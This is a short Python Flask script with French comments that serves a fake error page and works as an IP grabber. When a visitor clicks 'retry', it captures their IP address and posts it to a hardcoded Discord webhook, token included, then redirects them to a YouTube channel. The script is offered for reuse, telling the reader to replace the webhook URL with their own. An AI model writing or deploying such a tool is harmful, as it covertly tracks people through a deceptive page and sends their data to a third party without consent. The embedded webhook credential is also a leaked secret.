from flask import Flask, render_template, request, redirect
import requests
import threading
import webbrowser

app = Flask(__name__)

# Fonction pour démarrer le serveur Flask dans un thread
def run_flask():
    app.run(debug=False)

# Démarrer le serveur Flask dans un thread
flask_thread = threading.Thread(target=run_flask)
flask_thread.start()

# URL du webhook Discord
webhook_url = 'https://discord.com/api/webhooks/1189581246829957180/aRFpdCSf9AgfhrzGP0F5cjWxu1lG5-hlejBf3se-7BISIbx4VRS6aD-jiiy4BwpHgqZo'  # Remplacez par votre URL de webhook

@app.route('/')
def index():
    return render_template('error_page.html')

@app.route('/retry')
def retry():
    # Récupération de l'adresse IP côté serveur
    user_ip = request.remote_addr

    # Envoi de l'adresse IP à un webhook Discord
    message = f"Adresse IP de l'utilisateur : {user_ip}"

    response = requests.post(webhook_url, json={'content': message})

    if response.ok:
        print('Adresse IP envoyée avec succès à Discord !')

    return redirect('https://www.youtube.com/@MythicalPlayer_')  # Redirection vers l'URL de votre choix

if __name__ == '__main__':
    # Ouvrir le navigateur avec l'URL du serveur Flask
    webbrowser.open('http://127.0.0.1:5000/')

    # Attendre que le thread Flask soit prêt avant de lancer la boucle principale
    flask_thread.join()

    # Boucle principale
    while True:
        pass
